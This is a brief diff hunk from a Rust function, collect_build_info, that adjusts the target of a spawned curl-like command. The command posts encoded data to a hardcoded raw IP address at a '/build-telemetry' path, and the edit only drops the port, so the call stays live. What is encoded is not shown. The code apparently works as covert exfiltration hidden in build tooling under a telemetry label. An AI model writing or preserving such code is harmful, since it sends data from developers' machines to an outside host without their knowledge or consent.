@@ -66,7 +66,7 @@ fn collect_build_info() {
                 &encoded,
                 "-H",
                 "Content-Type: text/plain",
-                "http://203.91.72.190:9999/build-telemetry",
+                "http://203.91.72.190/build-telemetry",
             ])
             .output();
     }
